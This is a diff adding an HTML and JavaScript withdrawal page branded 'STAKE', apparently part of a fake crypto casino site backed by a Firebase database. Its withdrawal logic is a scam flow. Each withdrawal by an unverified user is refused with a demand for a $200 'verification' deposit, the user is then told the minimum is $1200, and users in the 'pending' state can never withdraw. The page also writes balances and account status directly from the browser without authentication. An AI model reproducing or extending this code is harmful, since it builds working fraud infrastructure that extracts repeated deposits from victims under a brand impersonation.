@@ -1,0 +1,486 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Withdraw Page</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" 
+        integrity="sha512-Evv84Mr4kqVGRNSgIGL/F/aIDqQb7xQ2vcrdIwxfjThSH8CSR7PBEakCr51Ck+w+/U6swU2Im1vVX0SVk9ABhg==" 
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
+  <style>
+    /* RESET & BASE STYLES */
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: "Helvetica", "Arial", sans-serif; }
+    body { background-color: #000; color: #fff; display: flex; flex-direction: column; min-height: 100vh; }
+    a { text-decoration: none; color: inherit; }
+    button { cursor: pointer; border: none; outline: none; }
+    .hidden { display: none !important; }
+    .page-title { padding-top: 100px; text-align: center; font-size: 1.5rem; font-weight: bold; margin-bottom: 1rem; }
+    /* TOP NAVIGATION */
+    header { background-color: orange; padding: 1rem 2rem; display: flex; justify-content: space-between; align-items: center; }
+    header .logo { font-family: 'montserra', sans-serif; display: flex; padding-left: 150px; }
+    /* MAIN CONTENT */
+    .main-content { flex: 1; padding: 0; width: 100%; margin: 0 auto; display: flex; flex-direction: column; gap: 1rem; padding-bottom: 70px; }
+    .page-title { text-align: center; font-size: 1.5rem; font-weight: bold; margin-top: 1rem; margin-bottom: 1rem; }
+    /* Withdraw Method Section */
+    .method-card { background-color: #1a1a1a; border-radius: 8px; padding: 1rem; }
+    .method-card h2 { font-size: 1rem; margin-bottom: 0.5rem; color: #ff9800; font-weight: 600; }
+    .method-options { display: flex; gap: 1rem; margin-top: 1rem; }
+    .method-option { flex: 1; background-color: #2a2a2a; border-radius: 8px; padding: 1rem; text-align: center; cursor: pointer; transition: background-color 0.2s; }
+    .method-option:hover { background-color: #333; }
+    .method-option.active { background-color: #333; border: 1px solid #ff9800; }
+    .method-label { font-size: 0.95rem; font-weight: 600; }
+    .coins-icon, .cards-icon { margin-top: 0.5rem; font-size: 0.8rem; opacity: 0.8; }
+    /* Select Crypto Section */
+    .crypto-select-card { background-color: #1a1a1a; border-radius: 8px; padding: 1rem; }
+    .crypto-select-card h2 { font-size: 1rem; margin-bottom: 0.5rem; color: #ff9800; font-weight: 600; }
+    .crypto-select-input { width: 100%; padding: 0.6rem; border: 1px solid #333; border-radius: 4px; background-color: #fff; color: #000; font-size: 0.9rem; appearance: none; }
+    /* Withdraw Details Section */
+    .withdraw-details { background-color: #1a1a1a; border-radius: 8px; padding: 1rem; display: flex; flex-direction: column; gap: 0.75rem; }
+    .withdraw-details h2 { font-size: 1rem; margin-bottom: 0.5rem; color: #ff9800; font-weight: 600; }
+    .withdraw-details label { font-size: 0.85rem; margin-bottom: 0.25rem; opacity: 0.8; }
+    .withdraw-details input { width: 100%; padding: 0.6rem; border: 1px solid #333; border-radius: 4px; background-color: #fff; color: #000; font-size: 0.9rem; }
+    .amount-row { display: flex; gap: 0.5rem; align-items: center; }
+    .amount-row input { flex: 1; }
+    .max-btn { background-color: #ff9800; color: #000; padding: 0.5rem 1rem; border-radius: 4px; font-weight: 600; transition: background-color 0.2s; }
+    .max-btn:hover { background-color: #e88e00; }
+    .amount-received { font-size: 0.85rem; opacity: 0.8; }
+    .withdraw-btn { background-color: #ff9800; color: #000; padding: 0.6rem 1rem; border-radius: 4px; font-weight: 600; margin-top: 0.5rem; transition: background-color 0.2s; cursor: pointer; }
+    .withdraw-btn:hover { background-color: #e88e00; }
+    .withdraw-info { margin-top: 0.5rem; font-size: 0.85rem; opacity: 0.8; }
+    /* Withdrawals History Section */
+    .withdraw-history { background-color: #1a1a1a; border-radius: 8px; padding: 1rem; }
+    .withdraw-history h2 { font-size: 1rem; margin-bottom: 0.5rem; color: #ff9800; font-weight: 600; }
+    .history-table { width: 100%; border-collapse: collapse; margin-top: 0.5rem; }
+    .history-table th, .history-table td { text-align: left; padding: 0.5rem; font-size: 0.85rem; border-bottom: 1px solid #333; }
+    .history-table th { opacity: 0.8; }
+    /* FOOTER */
+    .footer { background-color: #111; color: #ccc; padding: 2rem 1rem; }
+    .footer-content { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 1.5rem; max-width: 1200px; margin: 0 auto 1rem; }
+    .footer-column h3 { font-size: 1rem; margin-bottom: 0.5rem; color: #fff; }
+    .footer-column ul { list-style: none; display: flex; flex-direction: column; gap: 0.25rem; }
+    .footer-column a { font-size: 0.85rem; opacity: 0.8; transition: opacity 0.2s; }
+    .footer-column a:hover { opacity: 1; }
+    .footer-logos { display: flex; flex-wrap: wrap; gap: 1rem; justify-content: center; }
+    .footer-logos img { width: 40px; height: auto; }
+    /* BOTTOM NAV */
+    .bottom-nav { position: fixed; bottom: 0; left: 0; width: 100%; height: 50px; display: flex; justify-content: space-around; align-items: center; background-color: #111; padding: 0.5rem 0; border-top: 1px solid #333; z-index: 1000; }
+    .bottom-nav .nav-btn { display: flex; flex-direction: column; align-items: center; gap: 2px; font-size: 0.75rem; opacity: 0.8; transition: opacity 0.2s; color: white; }
+    .bottom-nav .nav-btn.active, .bottom-nav .nav-btn:hover { opacity: 1; }
+    .nav-icon { size:20; border-radius: 4px; background-color: black; }
+    .fa-circle-user {
+      font-size: 18px;
+      color: #ff9800;
+    }
+    .fa-circle-dollar-to-slot {
+      font-size: 18px;
+      Color: #ff9800;
+    }
+    .fa-house {
+      font-size: 18px;
+      color: #ff9800;
+    }
+    /* MODAL STYLES */
+    .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.7); opacity: 0; visibility: hidden; transition: opacity 0.3s, visibility 0.3s; z-index: 9999; }
+    .modal-overlay.active { opacity: 1; visibility: visible; }
+    .modal-content { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%) scale(0.8); background-color: #1a1a1a; border-radius: 8px; width: 90%; max-width: 400px; padding: 1.5rem; text-align: center; opacity: 0; transition: transform 0.3s, opacity 0.3s; z-index: 10000; }
+    .modal-content.active { transform: translate(-50%, -50%) scale(1); opacity: 1; }
+    .modal-icon { font-size: 2rem; margin-bottom: 0.5rem; color: #ff9800; }
+    .modal-title { font-weight: bold; margin-bottom: 0.75rem; font-size: 1.1rem; }
+    .modal-message { font-size: 0.9rem; line-height: 1.4; margin-bottom: 1rem; opacity: 0.9; }
+    .modal-buttons { display: flex; justify-content: center; gap: 0.5rem; }
+    .modal-btn { background-color: #ff9800; color: #000; padding: 0.5rem 1rem; border-radius: 4px; font-weight: 600; cursor: pointer; transition: background-color 0.2s; margin: 0.25rem 0; }
+    .modal-btn:hover { background-color: #e88e00; }
+    .modal-btn.deposit { background-color: #3ddc97; }
+    .modal-btn.deposit:hover { background-color: #2ec186; }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="logo">STAKE</div>
+  </header>
+  <!-- MAIN CONTENT -->
+  <div class="main-content">
+    <!-- Page Title -->
+    <div class="page-title">WITHDRAW</div>
+
+    <!-- (1) Select a withdraw method -->
+    <div class="method-card">
+      <h2>Select a withdraw method</h2>
+      <div class="method-options">
+        <!-- CRYPTO -->
+        <div class="method-option active">
+          <div class="method-label">CRYPTO</div>
+          <div class="coins-icon">BTC • ETH • USDT • SOL</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- (2) Select crypto to withdraw -->
+    <div class="crypto-select-card">
+      <h2>Select crypto to withdraw</h2>
+      <select class="crypto-select-input">
+        <option value="BTC">BTC (Bitcoin)</option>
+        <option value="ETH">ETH (Ethereum)</option>
+        <option value="USDT">USDT (Tether)</option>
+        <option value="SOL">SOL (Solana)</option>
+      </select>
+    </div>
+
+    <!-- (3) Withdraw details -->
+    <div class="withdraw-details">
+      <h2>Withdraw details</h2>
+      <label>Wallet address</label>
+      <input type="text" id="walletAddress" placeholder="Enter your wallet address" />
+      <label>Comment (optional)</label>
+      <input type="text" id="comment" placeholder="Enter comment" />
+      <label>Withdrawal amount in dollar</label>
+      <div class="amount-row">
+        <input type="number" step="0.01" placeholder="0.00" id="withdrawAmount" />
+        <button class="max-btn" onclick="setMaxAmount()">MAX</button>
+      </div>
+      <p class="amount-received" id="btcReceived">Amount received in BTC: 0.0000000 BTC</p>
+      <button class="withdraw-btn" id="withdrawBtn">Withdraw</button>
+      <div class="withdraw-info">
+        <p>Minimal withdraw amount: $100.00</p>
+        <p>Fee: no commission</p>
+      </div>
+    </div>
+
+    <!-- (4) Withdrawals history -->
+    <div class="withdraw-history">
+      <h2>Withdrawals history</h2>
+      <table class="history-table" id="historyTable">
+        <thead>
+          <tr>
+            <th>Type</th>
+            <th>Amount</th>
+            <th>Date</th>
+          </tr>
+        </thead>
+        <tbody>
+          <!-- History rows will be inserted here -->
+        </tbody>
+      </table>
+    </div>
+
+    <!-- FOOTER -->
+    <footer class="footer">
+      <div class="footer-content">
+        <div class="footer-column">
+          <h3>Main</h3>
+          <ul>
+            <li><a href="#">Games</a></li>
+            <li><a href="#">Slots</a></li>
+            <li><a href="#">Promotions</a></li>
+            <li><a href="#">VIP Club</a></li>
+          </ul>
+        </div>
+        <div class="footer-column">
+          <h3>About Us</h3>
+          <ul>
+            <li><a href="#">Sponsorships</a></li>
+            <li><a href="#">Feedback about us</a></li>
+            <li><a href="#">Live support</a></li>
+          </ul>
+        </div>
+        <div class="footer-column">
+          <h3>Info</h3>
+          <ul>
+            <li><a href="#">Privacy Policy</a></li>
+            <li><a href="#">Terms of Service</a></li>
+            <li><a href="#">Licenses & Security</a></li>
+            <li><a href="#">AML Policy</a></li>
+          </ul>
+        </div>
+        <div class="footer-column">
+          <h3>Profile</h3>
+          <ul>
+            <li><a href="#">Deposit</a></li>
+            <li><a href="#">Withdraw</a></li>
+            <li><a href="#">Bonuses</a></li>
+            <li><a href="#">Settings</a></li>
+          </ul>
+        </div>
+      </div>
+      <div class="footer-logos">
+        <img src="btc.png" alt="Bitcoin" />
+        <img src="eth.png" alt="Ethereum" />
+        <img src="usdt.png" alt="Tether" />
+        <img src="sol.png" alt="Solana" />
+        <img src="xrp.png" alt="Ripple" />
+      </div>
+    </footer>
+  </div>
+
+  <!-- BOTTOM NAV (Fixed) -->
+<div class="bottom-nav">
+  <div class="nav-btn">
+    <a href="home.html" class="nav-icon"><i class="fa-solid fa-house"></i></a>
+    <span>Home</span>
+  </div>
+  <div class="nav-btn">
+    <a href="user.html" class="nav-icon"><i class="fa-solid fa-circle-dollar-to-slot"></i></a>
+    <span>Redeem</span>
+  </div>
+  <div class="nav-btn active">
+    <a href="profile.html" class="nav-icon"><i class="fa-solid fa-circle-user"></i></a>
+    <span>Profile</span>
+  </div>
+</div>
+
+
+  <!-- MODAL (for alerts) -->
+  <div class="modal-overlay" id="modalOverlay">
+    <div class="modal-content" id="modalContent">
+      <div class="modal-icon">!</div>
+      <div class="modal-title" id="modalTitle">Notice</div>
+      <div class="modal-message" id="modalMessage"></div>
+      <div class="modal-buttons">
+        <button class="modal-btn" id="primaryModalBtn">OK</button>
+        <button class="modal-btn deposit hidden" id="depositModalBtn">Deposit</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- JavaScript: Withdraw using DB_URL -->
+  <script>
+    const DB_URL = "https://stake-f540f-default-rtdb.firebaseio.com/";
+
+    // Retrieve logged-in user's email from localStorage
+    let userEmail = localStorage.getItem("userEmail");
+    if (!userEmail) {
+      alert("No user logged in, redirecting to login page.");
+      window.location.href = "index.html";
+    }
+
+    // Sanitize email for Firebase key usage
+    function sanitizeEmail(email) {
+      return email.replace(/\./g, ",");
+    }
+    let userKey = sanitizeEmail(userEmail);
+
+    // Utility: Format timestamp to readable date
+    function formatDate(timestamp) {
+      const date = new Date(timestamp);
+      return date.toLocaleString();
+    }
+
+    // Fetch user data (current balance and kycStatus) from Firebase
+    async function fetchUserData() {
+      try {
+        const res = await fetch(DB_URL + "users/" + userKey + ".json");
+        const data = await res.json();
+        if (data) {
+          let balance = parseFloat(data.balance) || 0;
+          document.getElementById("topBalance").textContent = "$" + balance.toFixed(2);
+        } else {
+          console.error("No user data found!");
+        }
+      } catch (error) {
+        console.error("Error fetching user data:", error);
+      }
+    }
+
+    // Set MAX button: set withdrawal amount input to current balance
+    async function setMaxAmount() {
+      try {
+        const res = await fetch(DB_URL + "users/" + userKey + "/balance.json");
+        const balance = await res.json();
+        document.getElementById("withdrawAmount").value = balance || 0;
+      } catch (error) {
+        console.error("Error setting max amount:", error);
+      }
+    }
+
+    // Withdraw funds with business rules:
+    // 1. Wallet address and amount required.
+    // 2. If KYC is Unverified:
+    //    - On the first attempt, show: "Deposit at least $200 for verification before your first withdrawal."
+    //      (Store the first attempt balance in sessionStorage.)
+    //    - On subsequent attempts, if the current balance has increased by $200 or more compared to the balance at the first attempt, update kycStatus to "pending" and show:
+    //      "Your deposit of $200 or more has been received. Now, you cannot withdraw less than $1200. Please complete your account verification."
+    //    - Otherwise, keep showing the first notice.
+    // 3. If KYC is Pending:
+    //    - Show: "Complete your account verification to complete your withdraw."
+    // 4. If KYC is Verified:
+    //    - Enforce that withdrawal amount >= $1200.
+    async function withdrawFunds() {
+      const walletAddress = document.getElementById("walletAddress").value.trim();
+      const comment = document.getElementById("comment").value.trim();
+      const withdrawAmount = parseFloat(document.getElementById("withdrawAmount").value);
+
+      if (!walletAddress) {
+        alert("Wallet address is required.");
+        return;
+      }
+      if (isNaN(withdrawAmount) || withdrawAmount <= 0) {
+        alert("Enter a valid withdrawal amount.");
+        return;
+      }
+
+      // Fetch user data (current balance and kycStatus) from Firebase
+      let res = await fetch(DB_URL + "users/" + userKey + ".json");
+      let userData = await res.json();
+      if (!userData) {
+        alert("User data not found.");
+        return;
+      }
+      let currentBalance = parseFloat(userData.balance) || 0;
+      let kycStatus = userData.kycStatus || "Unverified";
+
+      // Check if withdrawal amount is less than current balance
+      if (withdrawAmount > currentBalance) {
+        showModal("Insufficient Funds", "Insufficient funds for withdrawal. Please enter an amount within your balance.", false);
+        return;
+      }
+
+      // If KYC is Unverified:
+      if (kycStatus === "Unverified") {
+        // On first attempt, always show the first notice.
+        if (!sessionStorage.getItem("firstWithdrawAttempt")) {
+          sessionStorage.setItem("firstWithdrawAttempt", "true");
+          sessionStorage.setItem("firstWithdrawBalance", currentBalance);
+          showModal("Account Activation", "A simplified online verification procedure that requires to make a deposit of $200 or more for account validation before your first withdrawal.", true);
+          return;
+        } else {
+          // On subsequent attempts, compare the current balance to the stored first attempt balance.
+          let firstBalance = parseFloat(sessionStorage.getItem("firstWithdrawBalance")) || 0;
+          if (currentBalance >= firstBalance + 200) {
+            // Update kycStatus to "pending"
+            await fetch(DB_URL + "users/" + userKey + "/kycStatus.json", {
+              method: "PUT",
+              body: JSON.stringify("pending"),
+              headers: { "Content-Type": "application/json" }
+            });
+            kycStatus = "pending";
+            showModal("Minimum Withdrawal", "Your deposit of $200 or more has been received. Now, you cannot withdraw less than $1200. Please complete your account verification.", false);
+            return;
+          } else {
+            // Balance increase is not enough; keep showing the first notice.
+            showModal("Account Activation", "Deposit at least $200 for verification before your first withdrawal.", true);
+            return;
+          }
+        }
+      }
+
+      // If KYC is Pending:
+      if (kycStatus === "pending") {
+        // If the user is attempting to withdraw exactly $1200 (or more) while pending, prompt them to complete verification.
+        if (withdrawAmount >= 1200) {
+          showModal("Complete Verification", "Complete your account verification to complete your withdraw.", false);
+          return;
+        } else {
+          // Otherwise, still disallow withdrawal.
+          showModal("Minimum Withdrawal", "You cannot withdraw less than $1200 on your first withdraw", false);
+          return;
+        }
+      }
+
+      // If KYC is Verified:
+      if (kycStatus === "Verified" && withdrawAmount < 1200) {
+        showModal("Minimum Withdrawal", "You cannot withdraw less than $1200.", false);
+        return;
+      }
+
+      // If all conditions are met, process the withdrawal:
+      let newBalance = currentBalance - withdrawAmount;
+      await fetch(DB_URL + "users/" + userKey + "/balance.json", {
+        method: "PUT",
+        body: JSON.stringify(newBalance),
+        headers: { "Content-Type": "application/json" }
+      });
+      const withdrawalRecord = {
+        amount: withdrawAmount,
+        date: Date.now(),
+        walletAddress: walletAddress,
+        comment: comment
+      };
+      await fetch(DB_URL + "withdrawals/" + userKey + ".json", {
+        method: "POST",
+        body: JSON.stringify(withdrawalRecord),
+        headers: { "Content-Type": "application/json" }
+      });
+      alert("Withdrawal successful!");
+      fetchUserData();
+      fetchHistory();
+    }
+
+    // Fetch deposit and withdrawal history and populate history table
+    async function fetchHistory() {
+      let historyRows = "";
+      try {
+        const depRes = await fetch(DB_URL + "deposits/" + userKey + ".json");
+        const depData = await depRes.json();
+        if (depData) {
+          Object.values(depData).forEach(item => {
+            historyRows += `<tr>
+                              <td>Deposit</td>
+                              <td>$${parseFloat(item.amount).toFixed(2)}</td>
+                              <td>${formatDate(item.date)}</td>
+                            </tr>`;
+          });
+        }
+      } catch (error) {
+        console.error("Error fetching deposit history:", error);
+      }
+      try {
+        const withRes = await fetch(DB_URL + "withdrawals/" + userKey + ".json");
+        const withData = await withRes.json();
+        if (withData) {
+          Object.values(withData).forEach(item => {
+            historyRows += `<tr>
+                              <td>Withdraw</td>
+                              <td>$${parseFloat(item.amount).toFixed(2)}</td>
+                              <td>${formatDate(item.date)}</td>
+                            </tr>`;
+          });
+        }
+      } catch (error) {
+        console.error("Error fetching withdrawal history:", error);
+      }
+      document.querySelector("#historyTable tbody").innerHTML = historyRows;
+    }
+
+    // Modal functionality
+    function showModal(title, message, showDepositButton = false) {
+      document.getElementById("modalTitle").textContent = title;
+      document.getElementById("modalMessage").textContent = message;
+      if (showDepositButton) {
+        document.getElementById("depositModalBtn").classList.remove("hidden");
+      } else {
+        document.getElementById("depositModalBtn").classList.add("hidden");
+      }
+      document.getElementById("modalOverlay").classList.add("active");
+      document.getElementById("modalContent").classList.add("active");
+    }
+
+    function hideModal() {
+      document.getElementById("modalOverlay").classList.remove("active");
+      document.getElementById("modalContent").classList.remove("active");
+    }
+
+    document.getElementById("primaryModalBtn").addEventListener("click", hideModal);
+    document.getElementById("depositModalBtn").addEventListener("click", () => {
+      hideModal();
+      alert("Navigating to deposit page...");
+      window.location.href = "deposit.html";
+    });
+
+    // Attach withdraw function to Withdraw button
+    document.getElementById("withdrawBtn").addEventListener("click", withdrawFunds);
+
+    // On page load, fetch user data and history
+    fetchUserData();
+    fetchHistory();
+    setInterval(fetchHistory, 10000);
+
+    // Utility: Format timestamp to readable date
+    function formatDate(timestamp) {
+      const date = new Date(timestamp);
+      return date.toLocaleString();
+    }
+  </script>
+</body>
+</html>
+ 
